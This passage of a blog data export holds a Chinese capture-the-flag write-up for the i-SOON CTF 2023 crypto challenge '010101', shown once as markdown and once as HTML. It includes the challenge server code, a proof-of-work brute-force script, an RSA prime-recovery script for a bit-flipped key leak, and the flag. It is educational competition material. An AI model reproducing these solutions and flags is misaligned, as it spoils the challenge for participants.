解题步骤：\n  - `nc`连入服务器，获取`random_str[4:]`和`str_sha256`\n    ![](nc连接回显.png)\n  - 通过`getXXXX.py`爆破`random_str[:4]`，并将结果发送给服务器，获得`n，fake_p，c`\n    ```python\n    import hashlib\n    import itertools\n    from string import digits, ascii_letters, punctuation\n    alpha_bet=digits+ascii_letters+punctuation\n    strlist = itertools.product(alpha_bet, repeat=4)\n\n    sha256=\"5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3\"\n    tail=\"uLBLoFfDko5h5uA9\"\n\n    xxxx=''\n\n    for i in strlist:\n        data=i[0]+i[1]+i[2]+i[3]\n        data_sha=hashlib.sha256((data+str(tail)).encode()).hexdigest()\n        if(data_sha==str(sha256)):\n            xxxx=data\n            break\n\n    print(xxxx)\n    ```\n  - 基于`encrypt`函数，编写[`decrypt.py`](./files/decrypt.py)脚本，破解`p`，解密得到`flag`\n    ```python\n    # -*- coding:utf-8 -*-\n    import os\n    import random\n    import string\n    import hashlib\n    import socketserver\n    from Crypto.Util.number import long_to_bytes\n\n\n    n=909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661\n    fake_p='11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111'\n    c=694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493\n    e = 0x10001\n\n\n    fake_p1=list(fake_p[:1024])\n    fake_p2=list(fake_p[1024:])\n    p=0\n    q=0\n    for i, x in enumerate(fake_p1):\n        if x == '0':\n            p1=fake_p1[:i]+['1']+fake_p1[i+1:]\n            p2=fake_p2\n            p=int(''.join(p1)+''.join(p2),2)   \n            if n%p==0:\n                q=n//p\n                if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                    print(\"Get p q!\\n\")\n                    break\n                else:\n                    print(\"bad format1!\")\n            else:         \n                for j,y in enumerate(fake_p2):\n                    if y== '1':\n                        p2=fake_p2[:j]+['0']+fake_p2[j+1:]\n                        p=int(''.join(p1)+''.join(p2),2)   \n                        if n%p==0:\n                            q=n//p\n                            if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                                print(\"Get p q!\\n\")\n                                break\n                            else:\n                                print(\"bad format2!\")\n    print(p)\n    print(q)\n    phi_n = (p - 1) * (q - 1)\n    print(\"phi_n:\")\n    print(phi_n)\n    d = pow(e, -1, phi_n)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n    ```\n\n### FLAG\n\n```plain\nD0g3{sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ}\n```\n","slug":"WriteUp-第六届安洵杯网络安全挑战赛-010101","published":1,"updated":"2024-01-07T07:02:27.259Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvvix000dfoi85wr0g4t7","content":"<h2 id=\"赛事名称\"><a href=\"#赛事名称\" class=\"headerlink\" title=\"赛事名称\"></a>赛事名称</h2><p>i-SOON_CTF_2023<br>第六届安洵杯网络安全挑战赛   </p>\n<h2 id=\"赛事描述\"><a href=\"#赛事描述\" class=\"headerlink\" title=\"赛事描述\"></a>赛事描述</h2><p><a href=\"https://dce.i-soon.net/#/examineDetails\">https://dce.i-soon.net/#/examineDetails</a></p>\n<h2 id=\"赛事网址\"><a href=\"#赛事网址\" class=\"headerlink\" title=\"赛事网址\"></a>赛事网址</h2><p><a href=\"https://dce.i-soon.net/#/examineDetails\">https://dce.i-soon.net/#/examineDetails</a></p>\n<h2 id=\"010101\"><a href=\"#010101\" class=\"headerlink\" title=\"010101\"></a>010101</h2><h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> isPrime, long_to_bytes, getStrongPrime, bytes_to_long</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">b&quot;D0g3&#123;******************************************&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyServer</span>(socketserver.BaseRequestHandler):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">proof</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        random.seed(os.urandom(<span class=\"number\">8</span>))</span><br><span class=\"line\">        random_str = <span class=\"string\">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)])</span><br><span class=\"line\">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class=\"line\">        self.request.sendall((<span class=\"string\">&#x27;SHA256(XXXX + %s):%s\\n&#x27;</span> % (random_str[<span class=\"number\">4</span>:], str_sha256)).encode())</span><br><span class=\"line\">        self.request.sendall(<span class=\"string\">&#x27;Give Me XXXX:\\n&#x27;</span>.encode())</span><br><span class=\"line\">        XXXX = self.request.recv(<span class=\"number\">2048</span>).strip()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> hashlib.sha256((XXXX + random_str[<span class=\"number\">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">getPQN</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            p = getStrongPrime(<span class=\"number\">2048</span>)</span><br><span class=\"line\">            q = getStrongPrime(<span class=\"number\">2048</span>)</span><br><span class=\"line\">            n = p * q</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> p, q, n</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        p, q, n = self.getPQN()</span><br><span class=\"line\">        m = bytes_to_long(flag)</span><br><span class=\"line\">        e = <span class=\"number\">0x10001</span></span><br><span class=\"line\">        c = <span class=\"built_in\">pow</span>(m, e, n)</span><br><span class=\"line\">        p = <span class=\"built_in\">bin</span>(p)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        p1 = <span class=\"built_in\">list</span>(p[:<span class=\"number\">1024</span>])</span><br><span class=\"line\">        p2 = <span class=\"built_in\">list</span>(p[<span class=\"number\">1024</span>:])</span><br><span class=\"line\">        p1[random.choice([i <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(p1) <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27;1&#x27;</span>])] = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">        p2[random.choice([i <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(p1) <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27;0&#x27;</span>])] = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> n, <span class=\"string\">&#x27;&#x27;</span>.join(p1) + <span class=\"string\">&#x27;&#x27;</span>.join(p2), c</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.proof():</span><br><span class=\"line\">            self.request.sendall(<span class=\"string\">b&#x27;Error Hash!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        n, p, c = self.encrypt()</span><br><span class=\"line\">        self.request.sendall(<span class=\"string\">&#x27;Press 1 to get ciphertext\\n&#x27;</span>.encode())</span><br><span class=\"line\">        number = self.request.recv(<span class=\"number\">512</span>).strip().decode()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> number == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(n) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(p) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">            self.request.sendall((<span class=\"built_in\">str</span>(c) + <span class=\"string\">&#x27;\\n&#x27;</span>).encode())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.request.sendall(<span class=\"string\">&#x27;Incorrect input!\\n&#x27;</span>.encode())</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    sever = socketserver.ThreadingTCPServer((<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">10001</span>), MyServer)</span><br><span class=\"line\">    ThreadedTCPServer.allow_reuse_address = <span class=\"literal\">True</span></span><br><span class=\"line\">    ThreadedTCPServer.allow_reuse_port = <span class=\"literal\">True</span></span><br><span class=\"line\">    sever.serve_forever()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"考点\"><a href=\"#考点\" class=\"headerlink\" title=\"考点\"></a>考点</h3><ul>\n<li><code>crypto</code></li>\n<li><code>SHA256</code></li>\n<li><code>RSA</code></li>\n</ul>\n<h3 id=\"WriteUp\"><a href=\"#WriteUp\" class=\"headerlink\" title=\"WriteUp\"></a>WriteUp</h3><ul>\n<li>分析代码逻辑：<ul>\n<li><code>proof</code>：<ul>\n<li>随机生成一个字符串<code>random_str</code></li>\n<li>计算字符串的哈希值<code>str_sha256</code></li>\n<li>给出<code>random_str[4:]</code>和<code>str_sha256</code>，让用户计算<code>random_str[:4]</code></li>\n<li>如果用户给定的<code>random_str[:4]</code>和<code>random_str[4:]</code>的哈希值相同，则验证通过</li>\n</ul>\n</li>\n<li><code>getPQN</code>：<ul>\n<li>随机生成两个大素数<code>p</code>和<code>q</code>，满足以下要求：<code>p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096</code></li>\n<li><code>return p, q, n</code></li>\n</ul>\n</li>\n<li><code>encrypt</code>：<ul>\n<li>通过<code>getPQN</code>生成<code>p</code>和<code>q</code>和<code>n</code></li>\n<li>计算密文<code>c = pow(m, e, n)</code></li>\n<li>对<code>p</code>进行变换：前1024位随机挑选一个1变成0，后1024位随机挑选一位变成1，得到<code>fake_p</code></li>\n<li><code>return n, fake_p, c</code></li>\n</ul>\n</li>\n<li><code>handle</code>：   <ul>\n<li>通过<code>proof</code>函数判断用户输入的<code>XXXX</code>和<code>random_str[4:]</code>的哈希值是否相同         </li>\n<li>相同的话，通过<code>encrypt</code>函数对<code>flag</code>进行加密，返回<code>n, fake_p, c</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>解题步骤：<ul>\n<li><code>nc</code>连入服务器，获取<code>random_str[4:]</code>和<code>str_sha256</code><br><img src=\"/2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/nc%E8%BF%9E%E6%8E%A5%E5%9B%9E%E6%98%BE.png\"></li>\n<li>通过<code>getXXXX.py</code>爆破<code>random_str[:4]</code>，并将结果发送给服务器，获得<code>n，fake_p，c</code><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> digits, ascii_letters, punctuation</span><br><span class=\"line\">alpha_bet=digits+ascii_letters+punctuation</span><br><span class=\"line\">strlist = itertools.product(alpha_bet, repeat=<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sha256=<span class=\"string\">&quot;5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3&quot;</span></span><br><span class=\"line\">tail=<span class=\"string\">&quot;uLBLoFfDko5h5uA9&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">xxxx=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> strlist:</span><br><span class=\"line\">    data=i[<span class=\"number\">0</span>]+i[<span class=\"number\">1</span>]+i[<span class=\"number\">2</span>]+i[<span class=\"number\">3</span>]</span><br><span class=\"line\">    data_sha=hashlib.sha256((data+<span class=\"built_in\">str</span>(tail)).encode()).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(data_sha==<span class=\"built_in\">str</span>(sha256)):</span><br><span class=\"line\">        xxxx=data</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(xxxx)</span><br></pre></td></tr></table></figure></li>\n<li>基于<code>encrypt</code>函数，编写<a href=\"./files/decrypt.py\"><code>decrypt.py</code></a>脚本，破解<code>p</code>，解密得到<code>flag</code><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n=<span class=\"number\">909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661</span></span><br><span class=\"line\">fake_p=<span class=\"string\">&#x27;11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111&#x27;</span></span><br><span class=\"line\">c=<span class=\"number\">694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493</span></span><br><span class=\"line\">e = <span class=\"number\">0x10001</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fake_p1=<span class=\"built_in\">list</span>(fake_p[:<span class=\"number\">1024</span>])</span><br><span class=\"line\">fake_p2=<span class=\"built_in\">list</span>(fake_p[<span class=\"number\">1024</span>:])</span><br><span class=\"line\">p=<span class=\"number\">0</span></span><br><span class=\"line\">q=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(fake_p1):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"string\">&#x27;0&#x27;</span>:</span><br><span class=\"line\">        p1=fake_p1[:i]+[<span class=\"string\">&#x27;1&#x27;</span>]+fake_p1[i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">        p2=fake_p2</span><br><span class=\"line\">        p=<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(p1)+<span class=\"string\">&#x27;&#x27;</span>.join(p2),<span class=\"number\">2</span>)   </span><br><span class=\"line\">        <span class=\"keyword\">if</span> n%p==<span class=\"number\">0</span>:</span><br><span class=\"line\">            q=n//p</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Get p q!\\n&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;bad format1!&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:         </span><br><span class=\"line\">            <span class=\"keyword\">for</span> j,y <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(fake_p2):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> y== <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                    p2=fake_p2[:j]+[<span class=\"string\">&#x27;0&#x27;</span>]+fake_p2[j+<span class=\"number\">1</span>:]</span><br><span class=\"line\">                    p=<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(p1)+<span class=\"string\">&#x27;&#x27;</span>.join(p2),<span class=\"number\">2</span>)   </span><br><span class=\"line\">                    <span class=\"keyword\">if</span> n%p==<span class=\"number\">0</span>:</span><br><span class=\"line\">                        q=n//p</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> p.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> q.bit_length() == <span class=\"number\">2048</span> <span class=\"keyword\">and</span> n.bit_length() == <span class=\"number\">4096</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Get p q!\\n&quot;</span>)</span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;bad format2!&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">phi_n = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;phi_n:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(phi_n)</span><br><span class=\"line\">d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi_n)</span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"FLAG\"><a href=\"#FLAG\" class=\"headerlink\" title=\"FLAG\"></a>FLAG</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D0g3&#123;sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"赛事名称\"><a href=\"#赛事名称\" class=\"headerlink\" title=\"赛事名称\"></a>赛事名称</h2><p>i-SOON_CTF_2023<br>第六届安洵杯网络安全挑战赛   </p>\n<h2 id=\"赛事描述\"><a href=\"#赛事描述\" class=\"headerlink\" title=\"赛事描述\"></a>赛事描述</h2><p><a href=\"https://dce.i-soon.net/#/examineDetails\">https://dce.i-soon.net/#/examineDetails</a></p>\n<h2 id=\"赛事网址\"><a href=\"#赛事网址\" class=\"headerlink\" 